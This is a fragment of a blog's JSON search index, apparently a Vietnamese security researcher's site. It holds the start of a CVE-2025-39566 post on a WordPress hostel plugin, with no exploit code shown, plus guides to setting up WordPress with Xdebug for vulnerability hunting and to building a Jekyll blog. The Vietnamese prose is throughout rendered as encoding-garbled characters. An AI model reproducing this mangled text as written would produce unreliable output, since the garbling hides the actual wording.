\u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch 